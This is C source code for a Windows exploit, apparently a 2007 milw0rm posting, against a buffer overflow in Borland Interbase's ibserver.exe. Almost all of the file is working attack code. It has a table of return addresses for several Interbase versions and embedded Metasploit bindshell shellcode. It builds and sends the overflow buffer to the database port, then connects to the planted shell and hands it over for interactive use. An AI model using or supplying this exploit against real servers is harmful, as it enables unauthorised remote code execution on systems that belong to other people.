/*

	http://lists.grok.org.uk/pipermail/full-disclosure/2007-July/064882.html

	Groetjes aan mijn sletjes: Doopie, Sjaakhans, [PS] en Sleepwalker :P
	All your base are belong to FD2K2!

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32")

#define IB_PORT "3050"
// 0xFF - 0x8, jmp 8 bytes back
#define JMP "\x90\x90\xEB\xF7"
// 0xFFFFFFFF - (sizeof(shellcode) + BIG_JMP SIZE), jmp to beginning of shellcode
CHAR BIG_JMP[]="\xE9\xFF\xFF\xFF\xFF";
// BIG_JMP SIZE
#define BIG_JMP_SIZE 5

CHAR ASCII_SHIT[]=
"\r\n                   >__            _      ___\r\n"
"                  / __\\26/07/2007| | __ / __\\ ___  _ __   ___ \r\n"
"                 /__\\/// _` |/ __| |/ //__\\/// _ \\| '_ \\ / _ \\\r\n"
"                / \\/  \\ (_| | (__|   </ \\/  \\ (_) | | | |  __/\r\n"
"                \\_____/\\__,_|\\___|_|\\_\\_____/\\___/|_| |_|\\___>\r\n"
"                     _______________BackBone_(c)_2007_______\r\n\r\n";

struct
{
	char* cVersion;
	DWORD dwRet;
	DWORD dwLength1;
	DWORD dwLength2;
}
targets[]=
{
	{"Interbase Server 2007 <=SP1 v8.0.0.123-w32 (UNIVERSAL)",0x403D4D,2108,0x2000}, // pop,pop,ret ibserver.exe v8.0.0.123
	{"Interbase Server v7.5.0.129-w32 (UNIVERSAL)",0x403A5D,2108,0x2000}, // pop,pop,ret ibserver.exe v7.5.0.129
	{"Interbase Server v7.1.0.181-w32 (UNIVERSAL)",0x4039BD,1336,0x2000}, // pop,pop,ret ibserver.exe v7.1.0.181
	{"Interbase Server v6.0.1.6-w32 (UNIVERSAL) untested",0x403901,1336,0x2000}, // pop,pop,ret ibserver.exe v6.0.1.6
 },v;

// don't change the offset
#define PORT_OFFSET 170
#define BIND_PORT 10282

// bindshell shellcode from www.metasploit.com,mod by skylined
unsigned char shellcode[] =
  "\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52"
  "\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1"
  "\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a"
  "\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
  "\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"
  "\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32"
  "\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff"
  "\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe"
  "\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50"
  "\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff"
  "\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89"
  "\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff"
  "\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x60"
  "\x6a\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x23\xff\xff\xff\x89"
  "\xc6\x31\xdb\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x31\xdb\x56\x56"
  "\x56\x53\x53\x31\xc0\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53"
  "\x53\x53\x53\x6a\x44\x89\xe0\x53\x53\x53\x53\x54\x50\x53\x53\x53"
  "\x43\x53\x4b\x53\x53\x51\x53\x87\xfd\xbb\x21\xd0\x05\xd0\xe8\xdf"
  "\xfe\xff\xff\x5b\x31\xc0\x48\x50\x53\xbb\x43\xcb\x8d\x5f\xe8\xcf"
  "\xfe\xff\xff\x56\x87\xef\xbb\x12\x6b\x6d\xd0\xe8\xc2\xfe\xff\xff"
  "\x83\xc4\x5c\x61\xeb\x89";

#define SET_BIND_PORT(p) *(USHORT*)(shellcode+PORT_OFFSET)=htons(p);

unsigned long lookupaddress(const char* pchost)
{
	unsigned long nremoteaddr = inet_addr(pchost);

	if (nremoteaddr == INADDR_NONE)
	{
		struct hostent* phe = gethostbyname(pchost);

		if (phe == 0)
			return INADDR_NONE;
		nremoteaddr = *((u_long*)phe->h_addr_list[0]);
	}
	return nremoteaddr;
}

void showusage(char* argv)
{
	int i;

	printf("[*] Usage: %s ip[:port] target [bindport]\r\n", argv);
	printf("[*] Standard port=%d, Standard bindport=%d.\r\n",atoi(IB_PORT),BIND_PORT);
	printf("[*] Targets:\r\n\r\n");
	for (i=0;i<(sizeof(targets)/sizeof(v));i++)
		printf("\t%2d: %s\r\n",i,targets[i].cVersion);
}

void showinfo(void)
{
	printf("%s",ASCII_SHIT);
	printf("    Borland Interbase ibserver.exe Create-Request Buffer Overflow Vulnerability\r\n");
	printf("                       Advisory provided by TPTI-07-13.\r\n");
	printf("                            Exploit by BackBone.\r\n\r\n");
}

/* ripped from TESO code and modifed by ey4s for win32 */
void shell (int sock)
{
	int l;
	char buf[512];
	struct    timeval time;
	unsigned long    ul[2];

	time.tv_sec = 1;
	time.tv_usec = 0;

	while(1)
	{
		ul[0]=1;
		ul[1]=sock;

		l=select(0,(fd_set*)&ul,NULL,NULL,&time);
		if(l==1)
		{
			l=recv(sock,buf,sizeof(buf),0);
			if (l<=0)
			{
				printf("\r\n[-] connection closed.\n");
				return;
			}
			l=write(1,buf,l);
			if (l<=0)
			{
				printf("\r\n[-] connection closed.\n");
				return;
			}
		}
		else
		    {
			l=read(0,buf,sizeof(buf));
			if (l<=0)
			{
				printf("\r\n[-] connection closed.\n");
				return;
			}
			l=send(sock,buf,l,0);
			if (l<=0)
			{
				printf("\r\n[-] connection closed.\n");
				return;
			}
		}
	}
}

int main(int argc, char *argv[])
{
	char *host,*port;
	unsigned long ulip;
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in sock_in;
	char buffer[16384];
	int bind,type;
	unsigned int size=0;
	DWORD dwLen1,dwLen2;
	DWORD dwBigJmp=0xFFFFFFFF;
	int i;

	showinfo();

	if (argc<3 || argc>4)
	{
		showusage(argv[0]);
		return -1;
	}

	host=strtok(argv[1],":");
	if((port=strtok(NULL,":"))==0)
		port=IB_PORT;

	if (WSAStartup(MAKEWORD(1,0),&wsa)!=0)
	{
		printf("[-] WSAStartup() error.\r\n");
		return -1;
	}

	ulip=lookupaddress(host);
	if (ulip==INADDR_ANY || ulip==INADDR_NONE)
	{
		printf("[-] invalid ip or host.\r\n");
		return -1;
	}

	if (atoi(port)<0 || atoi(port)>65534)
	{
		printf("[-] invalid port.\r\n");
		return -1;
	}

	type=atoi(argv[2]);
	if (type>(sizeof(targets)/sizeof(v))-1 || type<0)
	{
		printf("[-] invalid target type.\r\n");
		return -1;
	}

	printf("[+] Target: %s\r\n",targets[type].cVersion);

	bind=BIND_PORT;
	if (argc==4)
	{
		if (atoi(argv[3])>0 && atoi(argv[3])<65535)
			bind=atoi(argv[3]);
	}
	SET_BIND_PORT(bind);

	s=socket(AF_INET, SOCK_STREAM,0);
	if (s==INVALID_SOCKET)
	{
		printf("[-] socket() error.\r\n",s);
		return -1;
	}

	sock_in.sin_port=htons((u_short)atoi(port));
	sock_in.sin_family=AF_INET;
	sock_in.sin_addr.s_addr=ulip;

	printf("[+] Connecting to %d.%d.%d.%d:%d ... ",ulip&0xff,(ulip>>8)&0xff,
		(ulip>>16)&0xff,(ulip>>24)&0xff,atoi(port));

	if (connect(s,(struct sockaddr*)&sock_in,sizeof(sock_in))==SOCKET_ERROR)
	{
		printf("Failed!\r\n");
		closesocket(s);
		WSACleanup();
		return -1;
	}

	printf("Ok.\r\n");

	// constructing the buffer
	memset(buffer,0,16384);

	memcpy(buffer,"\x00\x00\x00\x14\x00\x00\x00\x03",8);
	size+=8;

	dwLen1=htonl(targets[type].dwLength1+(sizeof(DWORD)*3));

	memcpy(buffer+size,&dwLen1,sizeof(DWORD));
	size+=sizeof(DWORD);

	memset(buffer+size,0x90,targets[type].dwLength1-(sizeof(shellcode)+BIG_JMP_SIZE));
	size+=targets[type].dwLength1-(sizeof(shellcode)+BIG_JMP_SIZE);

	// shellcode
	memcpy(buffer+size,shellcode,sizeof(shellcode));
	size+=sizeof(shellcode);

	// jump to shellcode (0xFFFFFFFF - (sizeof(shellcode)+BIG_JMP_SIZE)
	dwBigJmp-=sizeof(shellcode)+BIG_JMP_SIZE;
	// prepare jump code
	memcpy(BIG_JMP+1,&dwBigJmp,sizeof(DWORD));
	// write big jump code
	memcpy(buffer+size,BIG_JMP,BIG_JMP_SIZE);
	size+=BIG_JMP_SIZE;

	// jmp 8 bytes back
	memcpy(buffer+size,JMP,sizeof(DWORD));
	size+=sizeof(DWORD);

	// return addr
	memcpy(buffer+size,&targets[type].dwRet,sizeof(DWORD));
	size+=sizeof(DWORD);

	memset(buffer+size,0xFF,sizeof(DWORD));
	size+=sizeof(DWORD);

	dwLen2=htonl(targets[type].dwLength2);

	memcpy(buffer+size,&dwLen2,sizeof(DWORD));
	size+=sizeof(DWORD);

	memset(buffer+size,0x90,targets[type].dwLength2);
	size+=targets[type].dwLength2;

	printf("[+] Sending buffer (len: %u) ... ",size);

	if (!send(s,buffer,size,0))
	{
		printf("Failed.\r\n");
		closesocket(s);
		WSACleanup();
		return -1;
	}

	printf("Ok.\r\n");

	closesocket(s);

	Sleep(1000);

	printf("[+] Connecting to %d.%d.%d.%d:%d ... ",ulip&0xff,(ulip>>8)&0xff,
				(ulip>>16)&0xff,(ulip>>24)&0xff,bind);

	s=socket(AF_INET, SOCK_STREAM,0);
	if (s==INVALID_SOCKET)
	{
		printf("socket() error.\r\n",s);
		WSACleanup();
		return -1;
	}

	sock_in.sin_port=htons((u_short)bind);
	sock_in.sin_family=AF_INET;
	sock_in.sin_addr.s_addr=ulip;

	if (connect(s,(struct sockaddr*)&sock_in,sizeof(sock_in))==SOCKET_ERROR)
	{
		printf("Failed!\r\n");
		closesocket(s);
		WSACleanup();
		return -1;
	}

	printf("Ok!\r\n\r\n--- w000t w000t ---\r\n\r\n");

	shell(s);

	closesocket(s);

	WSACleanup();

	return 0;
}

// milw0rm.com [2007-07-30]
